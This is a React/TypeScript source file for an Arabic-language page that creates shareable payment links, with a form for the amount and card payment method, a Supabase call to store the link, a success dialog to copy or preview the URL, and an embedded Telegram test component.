import { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useCreateLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getCurrencySymbol, getCurrencyName, formatCurrency } from "@/lib/countryCurrencies";
import { getCompanyMeta } from "@/utils/companyMeta";
import { getCurrency, getDefaultTitle } from "@/utils/countryData";
import { generatePaymentLink } from "@/utils/paymentLinks";
import { CreditCard, DollarSign, Hash, Building2, Copy, ExternalLink, FileText } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import TelegramTest from "@/components/TelegramTest";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const CreatePaymentLink = () => {
  const { country } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  const countryData = getCountryByCode(country?.toUpperCase() || "");

  const [paymentAmount, setPaymentAmount] = useState("500");
  const [paymentMethod, setPaymentMethod] = useState("card");
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
  const [linkId, setLinkId] = useState("");

  const serviceBranding = getServiceBranding('payment');
  const paymentTheme = {
    primary: serviceBranding.colors.primary,
    secondary: serviceBranding.colors.secondary,
    gradient: serviceBranding.gradients?.primary || `linear-gradient(135deg, ${serviceBranding.colors.primary}, ${serviceBranding.colors.secondary})`,
    bgLight: "#f5f3ff"
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!paymentAmount) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال مبلغ السداد",
        variant: "destructive",
      });
      return;
    }

    try {
      const link = await createLink.mutateAsync({
        type: "payment",
        country_code: country || "",
        payload: {
          payment_amount: parseFloat(paymentAmount) || 500,
          payment_method: paymentMethod,
          selectedCountry: country || "SA",
        },
      });

      // Generate unified payment URL using the new function
      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: "payment",
        country: country || 'SA'
      });

      setCreatedPaymentUrl(paymentUrl);
      setLinkId(link.id);
      setShowSuccessDialog(true);

      toast({
        title: "تم إنشاء رابط السداد بنجاح!",
        description: "يمكنك الآن مشاركة الرابط مع العميل",
      });
    } catch (error) {
      console.error("Error creating payment link:", error);
      toast({
        title: "خطأ في إنشاء الرابط",
        description: "حدث خطأ أثناء إنشاء رابط السداد",
        variant: "destructive",
      });
    }
  };


  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center" dir="rtl" style={{ background: paymentTheme.bgLight }}>
        <div className="text-center p-8">
          <CreditCard className="w-16 h-16 mx-auto mb-4" style={{ color: paymentTheme.primary }} />
          <h2 className="text-2xl font-bold mb-2">الدولة غير موجودة</h2>
          <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
          <Button onClick={() => navigate('/services')} style={{ background: paymentTheme.gradient, color: 'white' }}>
            العودة للخدمات
          </Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen py-4" dir="rtl" style={{ background: `linear-gradient(to bottom, ${paymentTheme.bgLight}, white)` }}>
      <div className="container mx-auto px-4">
        {/* Telegram Test Component */}
        <div className="mb-6">
          <TelegramTest />
        </div>

        <div className="max-w-2xl mx-auto">
          <Card className="p-4 shadow-xl border-2" style={{ borderColor: `${paymentTheme.primary}20` }}>
            <div
              className="h-20 -m-4 mb-4 rounded-t-xl relative overflow-hidden"
              style={{ background: paymentTheme.gradient }}
            >
              <div className="absolute inset-0 bg-black/10" />
              <div className="absolute inset-0 flex items-center justify-between px-6">
                <div className="text-white">
                  <div className="flex items-center gap-2 mb-1">
                    <CreditCard className="w-6 h-6" />
                    <h1 className="text-xl font-bold">خدمة الدفع</h1>
                  </div>
                  <p className="text-sm opacity-90">إنشاء رابط سداد - {countryData.nameAr}</p>
                </div>
                <div className="text-4xl">💳</div>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">

              {/* Payment Amount */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm font-semibold" style={{ color: paymentTheme.primary }}>
                  <DollarSign className="w-3 h-3" />
                  مبلغ السداد *
                  {country && (
                    <span className="text-xs text-muted-foreground">
                      ({getCurrencyName(country)})
                    </span>
                  )}
                </Label>
                <Input
                  type="number"
                  value={paymentAmount}
                  onChange={(e) => setPaymentAmount(e.target.value)}
                  placeholder={country ? `0.00 ${getCurrencySymbol(country)}` : "0.00"}
                  className="h-10 text-sm border-2 font-semibold"
                  style={{ borderColor: `${paymentTheme.primary}20` }}
                  step="0.01"
                  min="0"
                />
                {country && (
                  <p className="text-xs text-muted-foreground mt-1">
                    💱 العملة: {getCurrencyName(country)} ({getCurrencySymbol(country)})
                  </p>
                )}
              </div>

              {/* Payment Method Selection */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm" style={{ color: paymentTheme.primary }}>
                  <CreditCard className="w-3 h-3" />
                  طريقة الدفع *
                </Label>
                <Select value={paymentMethod} onValueChange={setPaymentMethod}>
                  <SelectTrigger className="h-10 border-2" style={{ borderColor: `${paymentTheme.primary}30` }}>
                    <SelectValue placeholder="اختر طريقة الدفع" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    <SelectItem value="card">
                      <div className="flex items-center gap-2">
                        <CreditCard className="w-4 h-4" />
                        <span>بيانات البطاقة</span>
                      </div>
                    </SelectItem>
                  </SelectContent>
                </Select>
              </div>

              <Button
                type="submit"
                className="w-full py-6 text-base font-bold shadow-lg text-white mt-6"
                style={{ background: paymentTheme.gradient }}
                disabled={createLink.isPending}
              >
                {createLink.isPending ? (
                  <span>جاري الإنشاء...</span>
                ) : (
                  <>
                    <CreditCard className="w-5 h-5 ml-2" />
                    <span>إنشاء رابط السداد</span>
                  </>
                )}
              </Button>
            </form>
          </Card>
        </div>

        {/* Success Dialog */}
        <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
          <AlertDialogContent className="sm:max-w-md border-2" style={{ borderColor: paymentTheme.primary }} dir="rtl">
            <AlertDialogHeader>
              <AlertDialogTitle className="text-right text-xl flex items-center gap-2">
                <CreditCard className="w-6 h-6" style={{ color: paymentTheme.primary }} />
                <span>تم إنشاء رابط السداد بنجاح!</span>
              </AlertDialogTitle>
              <AlertDialogDescription className="text-right">
                يمكنك الآن مشاركة هذا الرابط مع العميل لدفع المبلغ المطلوب
              </AlertDialogDescription>
            </AlertDialogHeader>
            
            <div className="my-4">
              <div className="p-4 rounded-lg mb-4" style={{ background: paymentTheme.bgLight }}>
                <div className="flex items-center justify-between text-sm mb-2">
                  <span className="text-muted-foreground">المبلغ:</span>
                  <span className="font-bold text-lg" style={{ color: paymentTheme.primary }}>
                    {formatCurrency(parseFloat(paymentAmount) || 500, country || "SA")}
                  </span>
                </div>
              </div>

              <div className="bg-secondary/50 p-3 rounded-lg mb-3 break-all text-xs">
                {createdPaymentUrl}
              </div>
            </div>
            
            <AlertDialogFooter className="flex flex-row gap-2 justify-start">
              <Button
                variant="outline"
                onClick={() => {
                  navigator.clipboard.writeText(createdPaymentUrl);
                  toast({
                    title: "تم النسخ!",
                    description: "تم نسخ الرابط إلى الحافظة",
                  });
                }}
                className="flex-1"
                style={{ borderColor: paymentTheme.primary, color: paymentTheme.primary }}
              >
                <Copy className="w-4 h-4 ml-2" />
                نسخ الرابط
              </Button>
              <Button
                onClick={() => window.open(createdPaymentUrl, '_blank')}
                className="flex-1"
                style={{ background: paymentTheme.gradient }}
              >
                <ExternalLink className="w-4 h-4 ml-2" />
                معاينة
              </Button>
            </AlertDialogFooter>
          </AlertDialogContent>
        </AlertDialog>
      </div>
    </div>
  );
};

export default CreatePaymentLink;
